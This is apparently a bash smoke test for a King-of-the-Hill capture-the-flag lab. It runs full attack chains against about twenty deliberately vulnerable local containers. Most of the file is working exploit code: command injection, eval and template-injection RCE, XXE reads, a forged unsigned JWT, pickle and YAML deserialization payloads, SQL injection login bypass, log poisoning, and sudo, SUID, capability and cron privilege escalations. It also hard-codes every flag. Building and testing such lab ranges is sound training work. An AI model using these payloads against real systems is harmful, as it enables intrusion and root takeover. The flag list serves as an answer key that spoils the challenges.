#!/usr/bin/env bash
# Smoke test of ALL 9 hills: full chain attack->user->root->king + reset (revives the vuln).
# Requires the containers running (docker compose up in each deploy/hills/*).
# Returns non-zero on any FAIL.
set -uo pipefail
TOKEN="TOK-RED-7f3a9c"
# hill-7: forged alg:none admin JWT (header.payload. with empty signature)
JWT="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoic2F1cm9uIiwicm9sZSI6ImFkbWluIn0."
PASS=0; FAIL=0
ok(){ if [ "$1" = "$2" ]; then echo "  PASS $3"; PASS=$((PASS+1)); else echo "  FAIL $3 (got: [$1] exp: [$2])"; FAIL=$((FAIL+1)); fi; }
has(){ if echo "$1" | grep -q "$2"; then echo "  PASS $3"; PASS=$((PASS+1)); else echo "  FAIL $3 (got: [$1])"; FAIL=$((FAIL+1)); fi; }

# ---- per-hill attack extractors (echo user; echo root; echo king_readback) ----
h1_user(){ curl -s -G http://127.0.0.1:8081/ping --data-urlencode "host=x; cat /home/www/user.txt" | grep -o 'CTF{[^}]*}'; }
h1_root(){ curl -s -G http://127.0.0.1:8081/ping --data-urlencode 'host=x; sudo find /etc/hostname -exec cat /root/root.txt \;' | grep -o 'CTF{[^}]*}'; }
h1_king(){ curl -s -G http://127.0.0.1:8081/ping --data-urlencode "host=x; sudo find /etc/hostname -exec sh -c \"echo $TOKEN > /root/king.txt\" \;" >/dev/null;
           curl -s -G http://127.0.0.1:8081/ping --data-urlencode 'host=x; sudo find /etc/hostname -exec cat /root/king.txt \;' | grep -o 'TOK-[A-Za-z0-9-]*'; }

h2_user(){ curl -s -G http://127.0.0.1:8082/calc --data-urlencode "expr=__import__('subprocess').run(['cat','/home/www/user.txt'],capture_output=True,text=True).stdout" | grep -o 'CTF{[^}]*}'; }
h2_root(){ curl -s -G http://127.0.0.1:8082/calc --data-urlencode "expr=__import__('subprocess').run(['/usr/local/bin/rootbash','-p','-c','cat /root/root.txt'],capture_output=True,text=True).stdout" | grep -o 'CTF{[^}]*}'; }
h2_king(){ curl -s -G http://127.0.0.1:8082/calc --data-urlencode "expr=__import__('subprocess').run(['/usr/local/bin/rootbash','-p','-c','echo $TOKEN > /root/king.txt'],capture_output=True,text=True).stdout" >/dev/null;
           curl -s -G http://127.0.0.1:8082/calc --data-urlencode "expr=__import__('subprocess').run(['/usr/local/bin/rootbash','-p','-c','cat /root/king.txt'],capture_output=True,text=True).stdout" | grep -o 'TOK-[A-Za-z0-9-]*'; }

h3_login(){ curl -s -c /tmp/h3jar -o /dev/null -d 'user=admin&password=monkey123' http://127.0.0.1:8083/login; }
h3_user(){ h3_login; curl -s -b /tmp/h3jar -G http://127.0.0.1:8083/run --data-urlencode "cmd=cat /home/svc/user.txt" | grep -o 'CTF{[^}]*}'; }
h3_root(){ h3_login; curl -s -b /tmp/h3jar -G http://127.0.0.1:8083/run --data-urlencode "cmd=echo 'cat /root/root.txt > /tmp/pwn; chmod 644 /tmp/pwn' > /opt/hook.sh" >/dev/null; sleep 4;
           curl -s -b /tmp/h3jar -G http://127.0.0.1:8083/run --data-urlencode "cmd=cat /tmp/pwn" | grep -o 'CTF{[^}]*}'; }
h3_king(){ h3_login; curl -s -b /tmp/h3jar -G http://127.0.0.1:8083/run --data-urlencode "cmd=echo 'echo $TOKEN > /root/king.txt' > /opt/hook.sh" >/dev/null; sleep 4;
           curl -s -b /tmp/h3jar -G http://127.0.0.1:8083/run --data-urlencode "cmd=echo 'cat /root/king.txt > /tmp/k; chmod 644 /tmp/k' > /opt/hook.sh" >/dev/null; sleep 4;
           curl -s -b /tmp/h3jar -G http://127.0.0.1:8083/run --data-urlencode "cmd=cat /tmp/k" | grep -o 'TOK-[A-Za-z0-9-]*'; }

h4_user(){ curl -s -u admin:admin -G http://127.0.0.1:8084/script --data-urlencode "expr=__import__('subprocess').run(['cat','/home/jenkins/user.txt'],capture_output=True,text=True).stdout" | grep -o 'CTF{[^}]*}'; }
h4_root(){ curl -s -u admin:admin -G http://127.0.0.1:8084/script --data-urlencode "expr=__import__('subprocess').run(\"sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='cat /root/root.txt'\",shell=True,capture_output=True,text=True).stdout" | grep -o 'CTF{[^}]*}'; }
h4_king(){ curl -s -u admin:admin -G http://127.0.0.1:8084/script --data-urlencode "expr=__import__('subprocess').run(\"sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='sh -c \\\"echo $TOKEN > /root/king.txt\\\"'\",shell=True,capture_output=True,text=True).stdout" >/dev/null;
           curl -s -u admin:admin -G http://127.0.0.1:8084/script --data-urlencode "expr=__import__('subprocess').run(\"sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='cat /root/king.txt'\",shell=True,capture_output=True,text=True).stdout" | grep -o 'TOK-[A-Za-z0-9-]*'; }

# hill-5 (repair-gated boot -> command injection -> sudo find). Repair first, then /mine.
h5_repair(){ curl -s -X POST http://127.0.0.1:8085/rescue --data-urlencode $'cfg=set root=(hd0,gpt1)\nset passphrase="mellon"\nset boot=on' >/dev/null; }
h5_user(){ h5_repair; curl -s -G http://127.0.0.1:8085/mine --data-urlencode 'q=x; cat /home/moria/user.txt' | grep -o 'CTF{[^}]*}'; }
h5_root(){ h5_repair; curl -s -G http://127.0.0.1:8085/mine --data-urlencode 'q=x; sudo find /etc/hostname -exec cat /root/root.txt \;' | grep -o 'CTF{[^}]*}'; }
h5_king(){ h5_repair; curl -s -G http://127.0.0.1:8085/mine --data-urlencode "q=x; sudo find /etc/hostname -exec sh -c \"echo $TOKEN > /root/king.txt\" \;" >/dev/null;
           curl -s -G http://127.0.0.1:8085/mine --data-urlencode 'q=x; sudo find /etc/hostname -exec cat /root/king.txt \;' | grep -o 'TOK-[A-Za-z0-9-]*'; }

# hill-6 (XXE leaks user flag + attunement key -> command console -> sudo awk).
h6_scry(){ curl -s -X POST http://127.0.0.1:8086/scry --data-binary "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file://$1\">]><vision>&x;</vision>"; }
h6_user(){ h6_scry /home/palantir/user.txt | grep -o 'CTF{[^}]*}'; }
h6_key(){ h6_scry /opt/app/palantir.key | tr -d '\r\n'; }
h6_root(){ K=$(h6_key); curl -s -G http://127.0.0.1:8086/command --data-urlencode "key=$K" --data-urlencode "cmd=sudo awk 'BEGIN{system(\"cat /root/root.txt\")}' /dev/null" | grep -o 'CTF{[^}]*}'; }
h6_king(){ K=$(h6_key); curl -s -G http://127.0.0.1:8086/command --data-urlencode "key=$K" --data-urlencode "cmd=sudo awk 'BEGIN{system(\"echo $TOKEN > /root/king.txt\")}' /dev/null" >/dev/null;
           curl -s -G http://127.0.0.1:8086/command --data-urlencode "key=$K" --data-urlencode "cmd=sudo awk 'BEGIN{system(\"cat /root/king.txt\")}' /dev/null" | grep -o 'TOK-[A-Za-z0-9-]*'; }

# hill-7 (JWT alg:none -> admin RCE -> PATH-hijack via root cron 'keeper'; ~4s cron loop).
h7_user(){ curl -s -G http://127.0.0.1:8087/admin/exec --data-urlencode "auth=$JWT" --data-urlencode 'cmd=cat /home/watch/user.txt' | grep -o 'CTF{[^}]*}'; }
h7_root(){ curl -s -G http://127.0.0.1:8087/admin/exec --data-urlencode "auth=$JWT" --data-urlencode 'cmd=printf "#!/bin/sh\ncat /root/root.txt > /tmp/r; chmod 666 /tmp/r\n" > /opt/watchbin/keeper; chmod 755 /opt/watchbin/keeper' >/dev/null;
           sleep 6; curl -s -G http://127.0.0.1:8087/admin/exec --data-urlencode "auth=$JWT" --data-urlencode 'cmd=cat /tmp/r' | grep -o 'CTF{[^}]*}'; }
h7_king(){ curl -s -G http://127.0.0.1:8087/admin/exec --data-urlencode "auth=$JWT" --data-urlencode "cmd=printf '#!/bin/sh\necho $TOKEN > /root/king.txt\ncat /root/king.txt > /tmp/k; chmod 666 /tmp/k\n' > /opt/watchbin/keeper; chmod 755 /opt/watchbin/keeper" >/dev/null;
           sleep 6; curl -s -G http://127.0.0.1:8087/admin/exec --data-urlencode "auth=$JWT" --data-urlencode 'cmd=cat /tmp/k' | grep -o 'TOK-[A-Za-z0-9-]*'; }

# hill-8 (weak-cred CI console -> build RCE -> cap_setuid on forgepy).
h8_cookie(){ curl -s -i -X POST -d 'user=saruman&password=isengard' http://127.0.0.1:8088/forge/login | grep -i set-cookie | sed 's/.*forge=//; s/;.*//' | tr -d '\r'; }
h8_user(){ C=$(h8_cookie); curl -s -X POST -b "forge=$C" -d 'script=cat /home/orc/user.txt' http://127.0.0.1:8088/forge/run | grep -o 'CTF{[^}]*}'; }
h8_root(){ C=$(h8_cookie); curl -s -X POST -b "forge=$C" --data-urlencode "script=forgepy -c \"import os;os.setuid(0);os.system('cat /root/root.txt')\"" http://127.0.0.1:8088/forge/run | grep -o 'CTF{[^}]*}'; }
h8_king(){ C=$(h8_cookie); curl -s -X POST -b "forge=$C" --data-urlencode "script=forgepy -c \"import os;os.setuid(0);os.system('echo $TOKEN > /root/king.txt')\"" http://127.0.0.1:8088/forge/run >/dev/null;
           curl -s -X POST -b "forge=$C" --data-urlencode "script=forgepy -c \"import os;os.setuid(0);os.system('cat /root/king.txt')\"" http://127.0.0.1:8088/forge/run | grep -o 'TOK-[A-Za-z0-9-]*'; }

# hill-9 (SSTI -> RCE -> sudo sed).
h9_user(){ curl -s -G http://127.0.0.1:8089/greet --data-urlencode "name={{__import__('subprocess').run(['cat','/home/program/user.txt'],capture_output=True,text=True).stdout}}" | grep -o 'CTF{[^}]*}'; }
h9_root(){ curl -s -G http://127.0.0.1:8089/greet --data-urlencode "name={{__import__('subprocess').run(['sudo','sed','-n','p','/root/root.txt'],capture_output=True,text=True).stdout}}" | grep -o 'CTF{[^}]*}'; }
h9_king(){ curl -s -G http://127.0.0.1:8089/greet --data-urlencode "name={{__import__('subprocess').run(['sudo','sed','-n','1e echo $TOKEN > /root/king.txt','/etc/hostname'],capture_output=True,text=True).stdout}}" >/dev/null;
           curl -s -G http://127.0.0.1:8089/greet --data-urlencode "name={{__import__('subprocess').run(['sudo','sed','-n','p','/root/king.txt'],capture_output=True,text=True).stdout}}" | grep -o 'TOK-[A-Za-z0-9-]*'; }

# hill-10 (pickle deserialization RCE -> SUID find). Payload built via heredoc.
h10_pay(){ python3 - "$1" <<'PY'
import pickle,base64,subprocess,sys
class E:
    def __reduce__(self): return (subprocess.getoutput,(sys.argv[1],))
print(base64.b64encode(pickle.dumps(E())).decode())
PY
}
h10_run(){ curl -s -G http://127.0.0.1:8090/console --data-urlencode "data=$(h10_pay "$1")"; }
h10_user(){ h10_run 'cat /home/mcp/user.txt' | grep -o 'CTF{[^}]*}'; }
h10_root(){ h10_run '/usr/local/bin/mcp_ctl /etc/hostname -exec cat /root/root.txt \;' | grep -o 'CTF{[^}]*}'; }
h10_king(){ h10_run "/usr/local/bin/mcp_ctl /etc/hostname -fprintf /root/king.txt $TOKEN" >/dev/null;
            h10_run '/usr/local/bin/mcp_ctl /etc/hostname -exec cat /root/king.txt \;' | grep -o 'TOK-[A-Za-z0-9-]*'; }

# hill-14 (SQLi auth bypass -> operator console -> sudo perl).
h14_sess(){ curl -s -i -X POST --data-urlencode "name=' OR 1=1 -- " --data-urlencode 'pass=x' http://127.0.0.1:8094/login | grep -i set-cookie | sed 's/.*sess=//; s/;.*//' | tr -d '\r'; }
h14_run(){ curl -s -b "sess=$(h14_sess)" -G http://127.0.0.1:8094/run --data-urlencode "cmd=$1"; }
h14_user(){ h14_run 'cat /home/navi/user.txt' | grep -o 'CTF{[^}]*}'; }
h14_root(){ h14_run 'sudo perl -e '\''system("cat /root/root.txt")'\''' | grep -o 'CTF{[^}]*}'; }
h14_king(){ h14_run "sudo perl -e 'system(\"echo $TOKEN > /root/king.txt\")'" >/dev/null;
            h14_run 'sudo perl -e '\''system("cat /root/king.txt")'\''' | grep -o 'TOK-[A-Za-z0-9-]*'; }

# hill-17 (SSTI spell portal -> sudo python3).
h17_cast(){ curl -s -G http://127.0.0.1:8097/cast --data-urlencode "spell=$1"; }
h17_user(){ h17_cast "{{__import__('subprocess').run(['cat','/home/wizard/user.txt'],capture_output=True,text=True).stdout}}" | grep -o 'CTF{[^}]*}'; }
h17_root(){ h17_cast "{{__import__('subprocess').run(['sudo','python3','-c','import os;os.system(\"cat /root/root.txt\")'],capture_output=True,text=True).stdout}}" | grep -o 'CTF{[^}]*}'; }
h17_king(){ h17_cast "{{__import__('subprocess').run(['sudo','python3','-c','open(\"/root/king.txt\",\"w\").write(\"$TOKEN\")'],capture_output=True,text=True).stdout}}" >/dev/null;
            h17_cast "{{__import__('subprocess').run(['sudo','python3','-c','print(open(\"/root/king.txt\").read())'],capture_output=True,text=True).stdout}}" | grep -o 'TOK-[A-Za-z0-9-]*'; }

# hill-19 (SSRF+LFI relay -> token leak -> RCE -> root cron on writable /opt/jobs).
h19_fetch(){ curl -s -G http://127.0.0.1:8099/fetch --data-urlencode "url=$1"; }
h19_user(){ h19_fetch 'file:///home/owl/user.txt' | grep -o 'CTF{[^}]*}'; }
h19_token(){ h19_fetch 'file:///opt/app/owl.token' | tr -d '\r\n '; }
h19_disp(){ curl -s -G http://127.0.0.1:8099/dispatch --data-urlencode "token=$(h19_token)" --data-urlencode "cmd=$1"; }
h19_root(){ h19_disp 'printf "#!/bin/sh\ncat /root/root.txt > /tmp/r; chmod 666 /tmp/r\n" > /opt/jobs/dispatch.sh; chmod 755 /opt/jobs/dispatch.sh' >/dev/null; sleep 5;
            h19_disp 'cat /tmp/r' | grep -o 'CTF{[^}]*}'; }
h19_king(){ h19_disp "printf '#!/bin/sh\necho $TOKEN > /root/king.txt\ncat /root/king.txt > /tmp/k; chmod 666 /tmp/k\n' > /opt/jobs/dispatch.sh; chmod 755 /opt/jobs/dispatch.sh" >/dev/null; sleep 5;
            h19_disp 'cat /tmp/k' | grep -o 'TOK-[A-Za-z0-9-]*'; }

# hill-11 (unauth debug API RCE -> writable unit ExecStart run by root).
h11_run(){ curl -s -G http://127.0.0.1:8091/api/_debug/run --data-urlencode "cmd=$1"; }
h11_user(){ h11_run 'cat /home/flynn/user.txt' | grep -o 'CTF{[^}]*}'; }
h11_root(){ h11_run 'printf "ExecStart=cat /root/root.txt > /tmp/r; chmod 666 /tmp/r\n" > /opt/units/arena.service' >/dev/null; sleep 5;
            h11_run 'cat /tmp/r' | grep -o 'CTF{[^}]*}'; }
h11_king(){ h11_run "printf 'ExecStart=echo $TOKEN > /root/king.txt; cat /root/king.txt > /tmp/k; chmod 666 /tmp/k\n' > /opt/units/arena.service" >/dev/null; sleep 5;
            h11_run 'cat /tmp/k' | grep -o 'TOK-[A-Za-z0-9-]*'; }

# hill-13 (command injection -> sudo dd read/write).
h13_run(){ curl -s -G http://127.0.0.1:8093/diag --data-urlencode "target=x; $1"; }
h13_user(){ h13_run 'cat /home/ops/user.txt' | grep -o 'CTF{[^}]*}'; }
h13_root(){ h13_run 'sudo dd if=/root/root.txt 2>/dev/null' | grep -o 'CTF{[^}]*}'; }
h13_king(){ h13_run "echo $TOKEN | sudo dd of=/root/king.txt 2>/dev/null" >/dev/null;
            h13_run 'sudo dd if=/root/king.txt 2>/dev/null' | grep -o 'TOK-[A-Za-z0-9-]*'; }

# hill-16 (repair-gated eval RCE -> sudo env). Repair is idempotent, done before each call.
h16_repair(){ curl -s 'http://127.0.0.1:8096/repair?mount=core-7&coolant=on' >/dev/null; }
h16_cal(){ h16_repair; curl -s -G http://127.0.0.1:8096/calibrate --data-urlencode "formula=$1"; }
h16_user(){ h16_cal "__import__('subprocess').run(['cat','/home/refiner/user.txt'],capture_output=True,text=True).stdout" | grep -o 'CTF{[^}]*}'; }
h16_root(){ h16_cal "__import__('subprocess').run(['sudo','env','cat','/root/root.txt'],capture_output=True,text=True).stdout" | grep -o 'CTF{[^}]*}'; }
h16_king(){ h16_cal "__import__('subprocess').run(['sudo','env','/bin/sh','-c','echo $TOKEN > /root/king.txt'],capture_output=True,text=True).stdout" >/dev/null;
            h16_cal "__import__('subprocess').run(['sudo','env','cat','/root/king.txt'],capture_output=True,text=True).stdout" | grep -o 'TOK-[A-Za-z0-9-]*'; }

# hill-18 (repair-gated YAML deserialization -> root-installed sudoers.d). getoutput takes one shell string.
h18_repair(){ curl -s 'http://127.0.0.1:8098/repair?ledger=rebuilt&seal=lifted' >/dev/null; }
h18_yaml(){ h18_repair; curl -s -X POST --data-binary "!!python/object/apply:subprocess.getoutput [\"$1\"]" http://127.0.0.1:8098/vault/open; }
h18_user(){ h18_yaml 'cat /home/goblin/user.txt' | grep -o 'CTF{[^}]*}'; }
h18_root(){ B=$(printf 'goblin ALL=(root) NOPASSWD: ALL\n' | base64 | tr -d '\n');
            h18_yaml "echo $B | base64 -d > /opt/vault/grants/pwn.sudo" >/dev/null; sleep 5;
            h18_yaml 'sudo cat /root/root.txt' | grep -o 'CTF{[^}]*}'; }
h18_king(){ h18_yaml "echo $TOKEN | sudo tee /root/king.txt" >/dev/null;
            h18_yaml 'sudo cat /root/king.txt' | grep -o 'TOK-[A-Za-z0-9-]*'; }

# hill-12 (repair-gated LFI + log poisoning -> RCE -> PATH-hijack root cron). Repair-first.
h12_repair(){ curl -s -X POST http://127.0.0.1:8092/rescue --data-urlencode 'cfg=set boot=on' >/dev/null; }
h12_user(){ h12_repair; curl -s -G http://127.0.0.1:8092/view --data-urlencode 'page=/home/kevin/user.txt' | grep -o 'CTF{[^}]*}'; }
h12_root(){ h12_repair
  UA='{{(__import__("pathlib").Path("/opt/arcade/bin/keeper").write_text("#!/bin/sh\ncat /root/root.txt > /tmp/r; chmod 666 /tmp/r\n"), __import__("os").chmod("/opt/arcade/bin/keeper",0o755))}}'
  curl -s -A "$UA" -G http://127.0.0.1:8092/view --data-urlencode 'page=/etc/hostname' >/dev/null
  curl -s -G http://127.0.0.1:8092/render --data-urlencode 'page=/var/log/arcade/access.log' >/dev/null; sleep 5
  curl -s -G http://127.0.0.1:8092/view --data-urlencode 'page=/tmp/r' | grep -o 'CTF{[^}]*}'; }
h12_king(){ h12_repair
  UA='{{(__import__("pathlib").Path("/opt/arcade/bin/keeper").write_text("#!/bin/sh\necho '"$TOKEN"' > /root/king.txt; cat /root/king.txt > /tmp/k; chmod 666 /tmp/k\n"), __import__("os").chmod("/opt/arcade/bin/keeper",0o755))}}'
  curl -s -A "$UA" -G http://127.0.0.1:8092/view --data-urlencode 'page=/etc/hostname' >/dev/null
  curl -s -G http://127.0.0.1:8092/render --data-urlencode 'page=/var/log/arcade/access.log' >/dev/null; sleep 5
  curl -s -G http://127.0.0.1:8092/view --data-urlencode 'page=/tmp/k' | grep -o 'TOK-[A-Za-z0-9-]*'; }

# hill-20 (repair-gated hidden debug RCE -> cap_dac_override). Repair-first.
h20_repair(){ curl -s -X POST http://127.0.0.1:8100/repair --data-urlencode 'runbook=set emergency=off' >/dev/null; }
h20_run(){ h20_repair; curl -s -G http://127.0.0.1:8100/marauders --data-urlencode 'iSolemnlySwear=I am up to no good' --data-urlencode "cmd=$1"; }
h20_user(){ h20_run 'cat /home/room/user.txt' | grep -o 'CTF{[^}]*}'; }
h20_root(){ h20_run 'roompy -c "print(open(\"/root/root.txt\").read())"' | grep -o 'CTF{[^}]*}'; }
h20_king(){ h20_run "roompy -c \"open('/root/king.txt','w').write('$TOKEN')\"" >/dev/null;
            h20_run 'roompy -c "print(open(\"/root/king.txt\").read())"' | grep -o 'TOK-[A-Za-z0-9-]*'; }
# hill-15 (Eywa) is intentionally excluded: its privesc is a host escape via the docker socket,
# which must never run on a shared host, so it is not part of the automated smoke.

uf(){ case "$1" in
  1) echo 'CTF{w3b_rc3_1gn1t10n_f00th0ld}';; 2) echo 'CTF{drup4lg3dd0n2_unauth_rce}';;
  3) echo 'CTF{r3d1s_un4uth_module_load}';;   4) echo 'CTF{j3nk1ns_gr00vy_scr1pt_c0ns0l3}';;
  5) echo 'CTF{sp34k_fr13nd_4nd_3nt3r_m0r14}';; 6) echo 'CTF{p4l4nt1r_xx3_s33s_4ll}';;
  7) echo 'CTF{jwt_4lg_n0n3_f0rg3d_th3_3y3}';;  8) echo 'CTF{w34k_f0r3m4n_cr3ds_1s3ng4rd}';;
  9) echo 'CTF{ss_t1_0n_th3_gr1d_10_t0w3r}';;
  10) echo 'CTF{p1ckl3_r3duc3_0n_th3_gr1d}';; 14) echo 'CTF{sql1_0r_1_3q_1_p4nd0r4}';;
  17) echo 'CTF{sst1_sp3ll_h0gw4rts_rc3}';;   19) echo 'CTF{ssrf_lf1_0wl_p0st_l34k}';;
  11) echo 'CTF{unauth_d3bug_l1ght_cycl3}';; 13) echo 'CTF{cmd_1nj_rd4_s3ns0r_d14g}';;
  16) echo 'CTF{r3p41r_3v4l_unobt41n1um}';;  18) echo 'CTF{y4ml_uns4f3_l04d_g0bl1ns}';;
  12) echo 'CTF{lf1_l0g_p01s0n_flynns_4rc4d3}';; 20) echo 'CTF{h1dd3n_m4r4ud3rs_m4p_rc3}';;  esac; }
rf(){ case "$1" in
  1) echo 'CTF{l4r4v3l_sud0_gtf0b1ns_r00t}';; 2) echo 'CTF{su1d_b1t_pr1v3sc_on_h0st}';;
  3) echo 'CTF{wr1t4bl3_cr0n_j0b_2_r00t}';;   4) echo 'CTF{h0st_pr1v3sc_sud0_r00t_w1n}';;
  5) echo 'CTF{sud0_f1nd_1n_th3_d33p_pl4c3s}';; 6) echo 'CTF{sud0_4wk_gtf0b1ns_0rth4nc}';;
  7) echo 'CTF{p4th_h1j4ck_1n_r00t_cr0n_w1n}';; 8) echo 'CTF{c4p_s3tu1d_0n_pyth0n_2_r00t}';;
  9) echo 'CTF{sud0_s3d_gtf0b1ns_d3_r3z}';;
  10) echo 'CTF{su1d_f1nd_d3r3z_t0_r00t}';;  14) echo 'CTF{sud0_p3rl_syst3m_2_r00t}';;
  17) echo 'CTF{sud0_pyth0n_expell14rmus}';; 19) echo 'CTF{r00t_cr0n_wr1t4bl3_m1n1stry}';;
  11) echo 'CTF{wr1t4bl3_un1t_3x3cst4rt_r00t}';; 13) echo 'CTF{sud0_dd_r34d_wr1t3_r00t}';;
  16) echo 'CTF{sud0_3nv_r00t_r3f1n3ry}';;    18) echo 'CTF{r00t_1nst4lls_sud03rs_gr1ng0tts}';;
  12) echo 'CTF{p4th_h1j4ck_4rc4d3_r00t}';;   20) echo 'CTF{c4p_d4c_0v3rr1d3_r00m}';; esac; }

for n in ${HILLS:-1 2 3 4 5 6 7 8 9 10 11 12 13 14 16 17 18 19 20}; do   # set HILLS to test a subset, e.g. HILLS="5 6 7 8 9"
  echo "=== hill-$n ==="
  ok "$(h${n}_user)" "$(uf $n)" "hill-$n user flag (foothold)"
  ok "$(h${n}_root)" "$(rf $n)" "hill-$n root flag (privesc)"
  ok "$(h${n}_king)" "$TOKEN"   "hill-$n write king.txt (take the hill)"
done

echo "=== reset revives the vuln (defense breaks privesc -> reset restores it) ==="
# break the privesc primitive for hill $1 (returns 1 for hills with no cheap check -> skipped)
break_privesc(){ case "$1" in
  1) docker exec koth-hill-1 rm -f /etc/sudoers.d/www 2>/dev/null;;
  2) docker exec koth-hill-2 chmod 0755 /usr/local/bin/rootbash 2>/dev/null;;
  4) docker exec koth-hill-4 rm -f /etc/sudoers.d/jenkins 2>/dev/null;;
  5) docker exec koth-hill-5 rm -f /etc/sudoers.d/moria 2>/dev/null;;           # reset also re-breaks boot -> h5_root re-repairs
  6) docker exec koth-hill-6 rm -f /etc/sudoers.d/palantir 2>/dev/null;;
  7) docker exec koth-hill-7 sh -c 'rm -f /opt/watchbin/keeper; chown root:root /opt/watchbin; chmod 755 /opt/watchbin' 2>/dev/null;;
  8) docker exec koth-hill-8 setcap -r /usr/local/bin/forgepy 2>/dev/null;;
  9) docker exec koth-hill-9 rm -f /etc/sudoers.d/program 2>/dev/null;;
  10) docker exec koth-hill-10 chmod u-s /usr/local/bin/mcp_ctl 2>/dev/null;;
  14) docker exec koth-hill-14 rm -f /etc/sudoers.d/navi 2>/dev/null;;
  17) docker exec koth-hill-17 rm -f /etc/sudoers.d/wizard 2>/dev/null;;
  19) docker exec koth-hill-19 sh -c 'rm -f /opt/jobs/dispatch.sh; chown root:root /opt/jobs; chmod 755 /opt/jobs' 2>/dev/null;;
  11) docker exec koth-hill-11 sh -c 'chmod 644 /opt/units/arena.service; rm -f /tmp/r' 2>/dev/null;;
  13) docker exec koth-hill-13 rm -f /etc/sudoers.d/ops 2>/dev/null;;
  16) docker exec koth-hill-16 rm -f /etc/sudoers.d/refiner 2>/dev/null;;
  18) docker exec koth-hill-18 sh -c 'rm -f /etc/sudoers.d/pwn* /opt/vault/grants/*.sudo; chown root:root /opt/vault/grants; chmod 755 /opt/vault/grants' 2>/dev/null;;
  12) docker exec koth-hill-12 sh -c 'rm -f /opt/arcade/bin/keeper /tmp/r; chown root:root /opt/arcade/bin; chmod 755 /opt/arcade/bin' 2>/dev/null;;
  20) docker exec koth-hill-20 setcap -r /usr/local/bin/roompy 2>/dev/null;;
  *) return 1;;                                                                  # hill-3 (writable cron): no cheap block/reset check
esac; }
for n in ${HILLS:-1 2 3 4 5 6 7 8 9 10 11 12 13 14 16 17 18 19 20}; do
  break_privesc "$n" || continue
  docker exec koth-hill-$n /opt/app/reset.sh >/dev/null 2>&1
  ok "$(h${n}_root)" "$(rf $n)" "hill-$n privesc works after reset"
done

echo "=== SMOKE: $PASS PASS / $FAIL FAIL ==="
[ "$FAIL" -eq 0 ]
